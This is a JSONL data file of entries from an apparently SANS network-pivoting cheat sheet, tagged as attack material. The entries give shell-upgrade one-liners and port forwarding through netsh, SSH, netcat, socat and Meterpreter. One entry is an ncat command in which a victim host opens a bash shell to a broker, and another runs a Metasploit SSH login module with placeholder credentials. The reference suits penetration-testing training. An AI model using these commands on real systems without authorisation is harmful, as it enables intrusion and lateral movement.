{"text": "Pivoting Cheat Sheet v1.2 - Navigating a client/victim environment often requires pivoting from target to target, and there are many ways to do so. This cheat sheet runs through various options for different environments and situations.", "metadata": {"source": "SANS_Pivoting", "title": "Purpose", "category": "attack", "platform": "cross-platform"}}
{"text": "Find a method that may fit your situation. In each, we model an attacker pivoting through pivot to reach SSH on victim. Substitute hosts and ports to fit your need. Pay attention to prompts as they will identify the host where the command should be run AND what type of prompt, i.e. Windows cmd.exe (c:\\>), PowerShell (PS), or Linux ($ or #).", "metadata": {"source": "SANS_Pivoting", "title": "How to Use this Sheet", "category": "attack", "platform": "cross-platform"}}
{"text": "Replace terms like victimAdmin and victimPass with appropriate credentials for the given system.", "metadata": {"source": "SANS_Pivoting", "title": "Credential Placeholders", "category": "attack", "platform": "cross-platform"}}
{"text": "You need to access SSH on port 22 of victim, but you can't go directly due to those meddling firewalls. For simplicity, this sheet will generally be using ports 1337, 4000, and 22 on the Attacker, Pivot, and Victim machines.", "metadata": {"source": "SANS_Pivoting", "title": "Situation", "category": "attack", "platform": "cross-platform"}}
{"text": "Upgrade Ugly Shells with Python: $ python -c 'import pty; pty.spawn(\"/bin/bash\")'", "metadata": {"source": "SANS_Pivoting", "title": "Upgrade Ugly Shells - Python", "category": "attack", "platform": "linux"}}
{"text": "Upgrade Ugly Shells with Ruby: $ ruby -e 'exec \"/bin/sh\"'", "metadata": {"source": "SANS_Pivoting", "title": "Upgrade Ugly Shells - Ruby", "category": "attack", "platform": "linux"}}
{"text": "Upgrade Ugly Shells with shell directly: $ /bin/sh -i or /bin/bash -i", "metadata": {"source": "SANS_Pivoting", "title": "Upgrade Ugly Shells - Shell", "category": "attack", "platform": "linux"}}
{"text": "Upgrade Ugly Shells with Perl: $ perl -e 'exec \"/bin/sh\";'", "metadata": {"source": "SANS_Pivoting", "title": "Upgrade Ugly Shells - Perl", "category": "attack", "platform": "linux"}}
{"text": "Further Upgrade Ugly Shells - Things seem off? Sometimes this can return functionality like arrow keys in a shell: victim $ <Ctrl>z, attacker $ stty raw -echo, attacker $ fg, victim $ reset, victim $ export SHELL=bash, victim $ export TERM=xterm256color, victim $ stty rows 40 columns 80", "metadata": {"source": "SANS_Pivoting", "title": "Further Upgrade Ugly Shells", "category": "attack", "platform": "linux"}}
{"text": "Maintain State with Screen: victim $ session -S hackinz (Session fails, Regain session, THEN:) victim $ session -r hackinz", "metadata": {"source": "SANS_Pivoting", "title": "Maintain State with Screen", "category": "attack", "platform": "linux"}}
{"text": "Want more functionality than screen? Check out tmux.", "metadata": {"source": "SANS_Pivoting", "title": "Tmux Alternative", "category": "attack", "platform": "linux"}}
{"text": "Is your connection not stable enough for ssh? mosh is more forgiving of spotty connections.", "metadata": {"source": "SANS_Pivoting", "title": "Mosh for Unstable Connections", "category": "attack", "platform": "linux"}}
{"text": "netsh Port Proxy: pivot c:\\> netsh interface portproxy add v4tov4 listenport=4000 listenaddress=0.0.0.0 connectport=22 connectaddress=victim.tgt, attacker $ ssh victimadmin@pivot.tgt", "metadata": {"source": "SANS_Pivoting", "title": "netsh Port Proxy", "category": "attack", "platform": "windows"}}
{"text": "SSH trail through Linux: attacker $ ssh pivotAdmin@pivot.tgt, pivot $ ssh victimAdmin@victim.tgt", "metadata": {"source": "SANS_Pivoting", "title": "SSH Trail Through Linux", "category": "attack", "platform": "linux"}}
{"text": "PowerShell sessions through Windows: attacker PS C:\\> Enter-PsSession -ComputerName pivot.tgt", "metadata": {"source": "SANS_Pivoting", "title": "PowerShell PsSession", "category": "attack", "platform": "windows"}}
{"text": "RDP session over Windows: attacker c:\\> mstsc.exe /v:Pivot.tgt psexec.exe Now, with command execution on pivot: pivot C:\\> ssh victimadmin@victim.tgt", "metadata": {"source": "SANS_Pivoting", "title": "RDP and PsExec", "category": "attack", "platform": "windows"}}
{"text": "No SSH available? How about PuTTY?", "metadata": {"source": "SANS_Pivoting", "title": "PuTTY Alternative", "category": "attack", "platform": "windows"}}
{"text": "Note that even if all the hosts in the chain run Windows, you can't typically PsSession twice because of how credentials are used. Run a search for pssession double hop for more info.", "metadata": {"source": "SANS_Pivoting", "title": "PsSession Double Hop Limitation", "category": "attack", "platform": "windows"}}
{"text": "Manage Many SSH Connections: Check out ProxyJump and .ssh/config to manage a wide array of ssh connections.", "metadata": {"source": "SANS_Pivoting", "title": "Manage Many SSH Connections", "category": "attack", "platform": "linux"}}
{"text": "SSH Pivots Require an sshd Setting: Set GatewayPorts yes in /etc/ssh/sshd_config, then: pivot # systemctl restart sshd", "metadata": {"source": "SANS_Pivoting", "title": "SSH Pivots sshd Setting", "category": "attack", "platform": "linux"}}
{"text": "SSH Local Port Forward: attacker $ ssh -fNL 1337:victim.tgt:22 pivoter@pivot.tgt, attacker $ ssh victimadmin@localhost -P 1337", "metadata": {"source": "SANS_Pivoting", "title": "SSH Local Port Forward", "category": "attack", "platform": "linux"}}
{"text": "SSH Remote Port Forward: pivot $ ssh -fNR 1337:victim.tgt:22 attacker@attacker.tgt, attacker $ ssh victimadmin@localhost -P 1337", "metadata": {"source": "SANS_Pivoting", "title": "SSH Remote Port Forward", "category": "attack", "platform": "linux"}}
{"text": "Proxychains: attacker $ ssh pivotadmin@pivot.tgt -D 9050 -fN, attacker $ proxychains ssh victimadmin@victim.tgt, And check /etc/proxychains.conf", "metadata": {"source": "SANS_Pivoting", "title": "Proxychains", "category": "attack", "platform": "linux"}}
{"text": "Some SSH Command Line Options: -f put ssh in the background after connecting, -N don't execute a command; just forward some ports, -P num use \"num\" port for ssh", "metadata": {"source": "SANS_Pivoting", "title": "SSH Command Line Options", "category": "attack", "platform": "linux"}}
{"text": "Netcat Port Forward: pivot $ cd /tmp && mknod backpipe p, pivot $ nc -lvp 4000 0<backpipe | nc -v victim.tgt 22 1>backpipe, attacker $ ssh victimadmin@pivot.tgt -P 4000", "metadata": {"source": "SANS_Pivoting", "title": "Netcat Port Forward", "category": "attack", "platform": "linux"}}
{"text": "Ncat Connection Brokering (Assumes code execution on victim): pivot$ ncat -vlp 4000 --broker, victim$ ncat pivot.tgt 4000 -e /bin/bash, attacker$ ncat pivot.tgt 4000", "metadata": {"source": "SANS_Pivoting", "title": "Ncat Connection Brokering", "category": "attack", "platform": "linux"}}
{"text": "Socat Port Forward: pivot $ socat TCP-LISTEN:4000,fork TCP:victim.tgt:22, attacker $ ssh victimadmin@pivot.tgt -P 4000", "metadata": {"source": "SANS_Pivoting", "title": "Socat Port Forward", "category": "attack", "platform": "linux"}}
{"text": "Meterpreter Port Forward: pivot Meterpreter > portfwd add -l 4000 -p 22 -r victim.tgt, attacker $ ssh victimadmin@pivot.tgt -P 4000", "metadata": {"source": "SANS_Pivoting", "title": "Meterpreter Port Forward", "category": "attack", "platform": "cross-platform"}}
{"text": "Metasploit/Meterpreter Autoroute: pivot Meterpreter > run post/multi/manage/autoroute SUBNET=pivotSubnet CMD=add, pivot Meterpreter > background, pivot msf > use scanner/ssh/ssh_login, pivot msf > set RHOSTS victim.tgt, pivot msf > set USERNAME victimAdmin, pivot msf > set PASSWORD victimPass, pivot msf > run", "metadata": {"source": "SANS_Pivoting", "title": "Metasploit/Meterpreter Autoroute", "category": "attack", "platform": "cross-platform"}}
{"text": "Practice Lab: Spin up your own practice range with this! https://github.com/chriselgee/SansPivotSheetLab", "metadata": {"source": "SANS_Pivoting", "title": "Practice Lab", "category": "attack", "platform": "cross-platform"}}
